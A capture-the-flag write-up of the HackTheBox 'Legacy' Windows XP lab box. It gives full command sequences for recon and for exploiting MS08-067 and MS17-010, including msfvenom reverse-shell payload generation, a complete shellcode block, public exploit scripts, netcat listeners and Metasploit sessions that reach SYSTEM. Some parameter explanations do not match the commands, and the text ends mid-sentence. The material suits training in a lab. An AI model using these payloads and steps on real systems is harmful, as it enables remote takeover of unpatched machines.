---
title:
  "HTB - Legacy"
date: 2021-04-26T01:00:27+02:00
cover:
  src: cover.png
draft: false
comments: true
socialShare: true
tags:
  - HTB
  - Legacy

aliases:
  - HTB-Legacy

---

# Overview

`Legacy` is an easy-rated, OSCP-like box on HackTheBox. It’s a Windows XP machine vulnerable to two well-known SMB exploits: **MS08-067** and **MS17-010**. While these vulnerabilities are often exploited using Metasploit, this walkthrough demonstrates how to exploit them manually, using **msfvenom** for payload generation and modifying public scripts to gain a shell.


- **Box Info**:
    
    - Name: Legacy
    - OS: Windows
    - Difficulty: Easy
    - Release Date: March 15, 2017
    - Retire Date: May 26, 2017
    - Creator: ch4p


# Recon

Nmap scans reveal the following open ports:

- **TCP 139 (NetBIOS)**: Open
- **TCP 445 (SMB)**: Open
- **TCP 3389 (RDP)**: Closed
- **UDP 137 (NetBIOS)**: Open

The host is identified as **Windows XP** with SMB exposed, making it a prime target for SMB-based exploits.

```
kali@kali:~$ nmap -sT -p- --min-rate 10000 10.10.10.4   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-08 12:35 EST
Warning: 10.10.10.4 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.4
Host is up (0.49s latency).
Not shown: 34358 closed tcp ports (conn-refused), 31175 filtered tcp ports (no-response)
PORT    STATE SERVICE
135/tcp open  msrpc
445/tcp open  microsoft-ds

```

```
kali@kali:~$ nmap -sU --min-rate 10000 10.10.10.4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-08 13:15 EST
Warning: 10.10.10.4 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.4
Host is up (0.52s latency).
Not shown: 992 closed udp ports (port-unreach)
PORT     STATE         SERVICE
123/udp  open          ntp
137/udp  open          netbios-ns
138/udp  open|filtered netbios-dgm
445/udp  open|filtered microsoft-ds
500/udp  open|filtered isakmp
1025/udp open|filtered blackjack
1900/udp open|filtered upnp
4500/udp open|filtered nat-t-ike

Nmap done: 1 IP address (1 host up) scanned in 7.23 seconds

```

```
kali@kali:~$ nmap -sC -sV -p 139,445 10.10.10.4  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-08 13:17 EST
Nmap scan report for 10.10.10.4
Host is up (0.58s latency).

PORT    STATE SERVICE      VERSION
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:bb:19 (VMware)
|_clock-skew: mean: 5d00h59m06s, deviation: 1h24m49s, median: 4d23h59m07s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2025-03-13T22:17:11+02:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.73 seconds

```


### SMB Enumeration

#### Null Authentication Attempt

During the initial enumeration phase, I attempted to authenticate to the SMB service without credentials to identify any accessible shares or misconfigurations. Both **smbmap** and **smbclient** were used for this purpose.

**Using smbmap**: 

The tool successfully established a connection to the SMB service but returned an **Access Denied** error, indicating that null authentication was not permitted.

```
kali@kali:~$ smbmap -H 10.10.10.4 

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 0 hosts serving SMB                                                                                                  
[*] Closed 0 connections 
```

**Using smbclient**:  

Attempting to list shares without authentication also failed, with the error **NT_STATUS_INVALID_PARAMETER**, further confirming that null sessions were not allowed.

```
kali@kali:~$ smbclient -N -L //10.10.10.4  
session setup failed: NT_STATUS_INVALID_PARAMETER
```

#### Vulnerabilities

Given that the target is a Windows XP host, it is highly likely to be vulnerable to several known exploits. To identify potential vulnerabilities, I utilized Nmap's built-in SMB vulnerability scripts. These scripts are designed to detect common weaknesses in SMB services, particularly on older Windows systems.

```
kali@kali:~$ ls /usr/share/nmap/scripts/ | grep smb | grep vuln  
smb2-vuln-uptime.nse
smb-vuln-conficker.nse
smb-vuln-cve2009-3103.nse
smb-vuln-cve-2017-7494.nse
smb-vuln-ms06-025.nse
smb-vuln-ms07-029.nse
smb-vuln-ms08-067.nse
smb-vuln-ms10-054.nse
smb-vuln-ms10-061.nse
smb-vuln-ms17-010.nse
smb-vuln-regsvc-dos.nse
smb-vuln-webexec.nse
```

I executed the following command to run all SMB vulnerability scripts against the target:

```
kali@kali:~$ nmap --script=smb-vuln* -p 139,445 10.10.10.4 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-08 13:23 EST
Nmap scan report for 10.10.10.4
Host is up (0.50s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-054: false
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Nmap done: 1 IP address (1 host up) scanned in 28.05 seconds

```

The scan revealed that the target is vulnerable to two critical SMB exploits:

1. **MS08-067**: A remote code execution vulnerability in the Server service.
2. **MS17-010 (EternalBlue)**: A remote code execution flaw in SMBv1.

Both vulnerabilities are well-documented and can lead to SYSTEM-level access, making them ideal candidates for exploitation.


# MS08-067 | CVE-2008-4250

I'm going to use this script to exploit this vulnerability : https://github.com/n3rdh4x0r/MS08-067 This script is a modified version of the original exploit, designed to work with custom shellcode and Impacket. Below is a detailed walkthrough of the process.

Reference: [https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2008/ms08-067?redirectedfrom=MSDN](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2008/ms08-067?redirectedfrom=MSDN)

#### Generating Custom Shellcode

The script requires custom shellcode to be inserted. I used **`msfvenom`** to generate a reverse TCP shell payload tailored for the target environment. The command used was:

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.8 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
```

**Parameters Explained**:

- **-p windows/shell_reverse_tcp**: Generates a reverse TCP shell payload.
- **LHOST=10.10.14.14**: Specifies the attacker's IP for the callback.
- **LPORT=443**: Specifies the listening port.
- **EXITFUNC=thread**: Ensures clean exit behavior.
- **-b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40"**: Excludes bad characters that could break the payload.
- **-f py**: Outputs the shellcode in Python format.
- **-a x86 --platform windows**: Targets a 32-bit Windows environment.

The generated shellcode was then pasted into the exploit script, replacing the default payload. I also added a comment with the `msfvenom` command for future reference.

```
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.8 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of py file: 1953 bytes
shellcode =  b""
shellcode += b"\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
shellcode += b"\x5e\x81\x76\x0e\x4d\xb3\x8e\xc2\x83\xee\xfc"
shellcode += b"\xe2\xf4\xb1\x5b\x0c\xc2\x4d\xb3\xee\x4b\xa8"
shellcode += b"\x82\x4e\xa6\xc6\xe3\xbe\x49\x1f\xbf\x05\x90"
shellcode += b"\x59\x38\xfc\xea\x42\x04\xc4\xe4\x7c\x4c\x22"
shellcode += b"\xfe\x2c\xcf\x8c\xee\x6d\x72\x41\xcf\x4c\x74"
shellcode += b"\x6c\x30\x1f\xe4\x05\x90\x5d\x38\xc4\xfe\xc6"
shellcode += b"\xff\x9f\xba\xae\xfb\x8f\x13\x1c\x38\xd7\xe2"
shellcode += b"\x4c\x60\x05\x8b\x55\x50\xb4\x8b\xc6\x87\x05"
shellcode += b"\xc3\x9b\x82\x71\x6e\x8c\x7c\x83\xc3\x8a\x8b"
shellcode += b"\x6e\xb7\xbb\xb0\xf3\x3a\x76\xce\xaa\xb7\xa9"
shellcode += b"\xeb\x05\x9a\x69\xb2\x5d\xa4\xc6\xbf\xc5\x49"
shellcode += b"\x15\xaf\x8f\x11\xc6\xb7\x05\xc3\x9d\x3a\xca"
shellcode += b"\xe6\x69\xe8\xd5\xa3\x14\xe9\xdf\x3d\xad\xec"
shellcode += b"\xd1\x98\xc6\xa1\x65\x4f\x10\xdb\xbd\xf0\x4d"
shellcode += b"\xb3\xe6\xb5\x3e\x81\xd1\x96\x25\xff\xf9\xe4"
shellcode += b"\x4a\x4c\x5b\x7a\xdd\xb2\x8e\xc2\x64\x77\xda"
shellcode += b"\x92\x25\x9a\x0e\xa9\x4d\x4c\x5b\x92\x1d\xe3"
shellcode += b"\xde\x82\x1d\xf3\xde\xaa\xa7\xbc\x51\x22\xb2"
shellcode += b"\x66\x19\xa8\x48\xdb\x84\xc8\x5d\xbb\xe6\xc0"
shellcode += b"\x4d\xb2\x35\x4b\xab\xd9\x9e\x94\x1a\xdb\x17"
shellcode += b"\x67\x39\xd2\x71\x17\xc8\x73\xfa\xce\xb2\xfd"
shellcode += b"\x86\xb7\xa1\xdb\x7e\x77\xef\xe5\x71\x17\x25"
shellcode += b"\xd0\xe3\xa6\x4d\x3a\x6d\x95\x1a\xe4\xbf\x34"
shellcode += b"\x27\xa1\xd7\x94\xaf\x4e\xe8\x05\x09\x97\xb2"
shellcode += b"\xc3\x4c\x3e\xca\xe6\x5d\x75\x8e\x86\x19\xe3"
shellcode += b"\xd8\x94\x1b\xf5\xd8\x8c\x1b\xe5\xdd\x94\x25"
shellcode += b"\xca\x42\xfd\xcb\x4c\x5b\x4b\xad\xfd\xd8\x84"
shellcode += b"\xb2\x83\xe6\xca\xca\xae\xee\x3d\x98\x08\x6e"
shellcode += b"\xdf\x67\xb9\xe6\x64\xd8\x0e\x13\x3d\x98\x8f"
shellcode += b"\x88\xbe\x47\x33\x75\x22\x38\xb6\x35\x85\x5e"
shellcode += b"\xc1\xe1\xa8\x4d\xe0\x71\x17"
```


#### Selecting the Target Version

```
Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445
Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)
Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal
Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English
Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)
Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)
Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)
```

The script requires specifying the target's Windows version and service pack. 

The exploit takes advantage of knowing where some little bits of code will be in memory, and uses those bits on the path to shell. For different version of Windows, the addresses of those gadgets will be different. For example, from the source:

```
        elif (self.os == '4'):
            print('Windows 2003 SP1 English\n')
            ret_dec = "\x8c\x56\x90\x7c"  # 0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
            ret_pop = "\xf4\x7c\xa2\x7c"  # 0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
            jmp_esp = "\xd3\xfe\x86\x7c"  # 0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
            disable_nx = "\x13\xe4\x83\x7c"  # 0x 7c 83 e4 13 NX disable @NTDLL.DLL
            jumper = disableNXjumper % (
                ret_dec * 6, ret_pop, disable_nx, jmp_esp * 2)
```

Based on the enumeration results, I identified the target as **Windows XP SP3 English (NX)**. 


#### **Running the Exploit**

With the shellcode in place and the target version selected, I set up a Netcat listener on port `443`:

```
nc -lnvp 443
```

Then, I executed the exploit script:

```
python3 MS08-067.py 10.10.10.4 6 445
```

![Pasted image 20250308095159](https://github.com/user-attachments/assets/aae1aa85-ae52-4d1f-a636-c57a0a582bae)


With SYSTEM-level access, I navigated to the user and administrator directories to retrieve the flags:

```
C:\Documents and Settings\john\Desktop>type user.txt
e69af0e4...

C:\Documents and Settings\Administrator\Desktop>type root.txt
993442d2...
```


##  Exploiting MS08-067 Using Metasploit

For those who prefer a more automated approach, **Metasploit** provides a reliable and efficient way to exploit the **MS08-067** vulnerability. Below is a step-by-step guide to exploiting the Legacy box using Metasploit.

Start Metasploit with the following command:

```
msfconsole -q
```

Use the `ms08_067_netapi` exploit module:

```
msf6 > use exploit/windows/smb/ms08_067_netapi
```

Set the target host (`RHOSTS`) and the listener IP (`LHOST`):

```
msf6 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 10.10.10.4
RHOSTS => 10.10.10.4

msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST tun0
LHOST => tun0
```

Verify the configuration with the `options` command:

```
msf6 exploit(windows/smb/ms08_067_netapi) > options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   10.10.10.4       yes       The target host(s)
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description 
   ----      ---------------  --------  ----------- 
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting
```

Execute the exploit with the `run` command:

```
msf6 exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.10.16.8:4444  
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (177734 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.16.8:4444 -> 10.10.10.4:1037) at 2025-03-08 14:03:00 -0500
```

Once the exploit succeeds, a Meterpreter session is established. Verify the privileges and explore the system:

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > pwd
C:\WINDOWS\system32

meterpreter > cd ../../
meterpreter > dir
Listing: C:\
============

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100777/rwxrwxrwx  0       fil   2017-03-16 01:30:44 -0400  AUTOEXEC.BAT
100666/rw-rw-rw-  0       fil   2017-03-16 01:30:44 -0400  CONFIG.SYS
040777/rwxrwxrwx  0       dir   2017-03-16 02:07:20 -0400  Documents and Settings
100444/r--r--r--  0       fil   2017-03-16 01:30:44 -0400  IO.SYS
100444/r--r--r--  0       fil   2017-03-16 01:30:44 -0400  MSDOS.SYS
100555/r-xr-xr-x  47564   fil   2008-04-13 16:13:04 -0400  NTDETECT.COM
040555/r-xr-xr-x  0       dir   2017-12-29 15:41:18 -0500  Program Files
040777/rwxrwxrwx  0       dir   2017-03-16 01:32:59 -0400  System Volume Information
040777/rwxrwxrwx  0       dir   2022-05-18 08:10:06 -0400  WINDOWS
100666/rw-rw-rw-  211     fil   2017-03-16 01:26:58 -0400  boot.ini
100444/r--r--r--  250048  fil   2008-04-13 18:01:44 -0400  ntldr
000000/---------  0       fif   1969-12-31 19:00:00 -0500  pagefile.sys

```

Navigate to the user and administrator directories to retrieve the flags:

```
meterpreter > cd "Documents and Settings\john\Desktop"
meterpreter > cat user.txt
e69af0e4...

meterpreter > cd "Documents and Settings\Administrator\Desktop"
meterpreter > cat root.txt
993442d2...
```


# Exploiting MS17-010 (EternalBlue) - CVE-2017-0143

The **MS17-010** vulnerability, also known as `EternalBlue`, is a critical remote code execution flaw in Microsoft's SMBv1 protocol. On the Legacy box, this vulnerability allows for SYSTEM-level access. 


Using `msfvenom` to Generate a Payload:

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.19 LPORT=1337 -f exe -o ms17-010.exe
```

- `-p windows/shell_reverse_tcp`: Specifies the payload (a reverse TCP shell for Windows).
- `LHOST=10.10.14.4`: The attacker's IP address (where the target will connect back).
- `LPORT=443`: The port on the attacker's machine to listen for the connection.
- `-f exe`: Outputs the payload as an executable file.
- `-a x86`: Specifies the architecture (32-bit).
- `-o rev.exe`: Saves the payload as `rev.exe`.

Setting Up a Docker Container:

- **Why Use Docker?**
    - Docker provides a consistent and isolated environment for running the exploit.
    - It avoids dependency issues (e.g., Python version conflicts, missing libraries).

Steps to Set Up Docker:

```
sudo apt-get install docker.io
```

Create a Folder Structure:

```
mkdir exploit
cd exploit
touch Dockerfile
echo "impacket==0.9.23" > requirements.txt
```

* `Dockerfile`: Contains instructions for building the Docker container.
* `requirements.txt`: Lists Python dependencies (e.g., `impacket`).

Write the Dockerfile:

```
FROM python:2.7-alpine
RUN apk --update --no-cache add \
    git \
    zlib-dev \
    musl-dev \
    libc-dev \
    gcc \
    libffi-dev \
    openssl-dev && \
    rm -rf /var/cache/apk/*

RUN mkdir -p /opt/exploit
COPY requirements.txt /opt/exploit
COPY ms17-010.exe /opt/exploit
WORKDIR /opt/exploit
RUN pip install -r requirements.txt
```

* `FROM python:2.7-alpine`: Uses a lightweight Alpine Linux image with Python 2.7.
* `RUN apk --update --no-cache add`: Installs necessary dependencies (e.g., `git`, `gcc`).
* `COPY rev.exe /opt/cattime`: Copies the reverse shell executable (`rev.exe`) into the container.
* `RUN pip install -r requirements.txt`: Installs Python dependencies (e.g., `impacket`).

Build the Docker Container:

```
sudo docker build -t exploit .
```

Run the Container:

```
sudo docker run -it exploit /bin/sh
```

Downloading and Running the Exploit:

```
git clone https://github.com/n3rdh4x0r/MS17-010_CVE-2017-0143.git
```

```
cd MS17-010_CVE-2017-0143
```

```
python send_and_execute.py 10.10.10.4 ../ms17-010.exe
```

Reverse Shell:

```
nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.4] 1035
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```


----

## Automated Python3 script. https://github.com/n3rdh4x0r/MS17-010

```
python3 exploit.py 10.10.10.4
```

![Pasted image 20250312115544](https://github.com/user-attachments/assets/9e38f8ad-359d-4d55-b427-8a09526e5480)


##  Exploiting MS17-010 Using Metasploit

Let's use metasploit to get the shell. 

```
┌──(kali㉿kali)-[~/exploit]
└─$ sudo msfconsole -q                 
msf6 > use windows/smb/ms17_010_psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_psexec) > show options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                                                 Required  Description
   ----                  ---------------                                                 --------  -----------
   DBGTRACE              false                                                           yes       Show extra debug trace info
   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                                yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT                 445                                                             yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                                                   no        Service description to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                  no        The service display name
   SERVICE_NAME                                                                          no        The service name
   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                               no        The password for the specified username
   SMBUser                                                                               no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS
RHOSTS => 
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.4
RHOSTS => 10.10.10.4
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
LHOST => 10.10.14.19
msf6 exploit(windows/smb/ms17_010_psexec) > run

[*] Started reverse TCP handler on 10.10.14.4:4444 
[*] 10.10.10.4:445 - Target OS: Windows 5.1
[*] 10.10.10.4:445 - Filling barrel with fish... done
[*] 10.10.10.4:445 - <---------------- | Entering Danger Zone | ---------------->
[*] 10.10.10.4:445 -    [*] Preparing dynamite...
[*] 10.10.10.4:445 -            [*] Trying stick 1 (x86)...Boom!
[*] 10.10.10.4:445 -    [+] Successfully Leaked Transaction!
[*] 10.10.10.4:445 -    [+] Successfully caught Fish-in-a-barrel
[*] 10.10.10.4:445 - <---------------- | Leaving Danger Zone | ---------------->
[*] 10.10.10.4:445 - Reading from CONNECTION struct at: 0x82236988
[*] 10.10.10.4:445 - Built a write-what-where primitive...
[+] 10.10.10.4:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.10.10.4:445 - Selecting native target
[*] 10.10.10.4:445 - Uploading payload... mxhfiscf.exe
[*] 10.10.10.4:445 - Created \mxhfiscf.exe...
[+] 10.10.10.4:445 - Service started successfully...
[*] Sending stage (175174 bytes) to 10.10.10.4
[*] 10.10.10.4:445 - Deleting \mxhfiscf.exe...
[*] Meterpreter session 1 opened (10.10.14.4:4444 -> 10.10.10.4:1031) at 2025-03-12 18:32:56 +1200

meterpreter >
```




















The exploit successfully triggered, and I received a reverse shell callback on the Netcat listener:
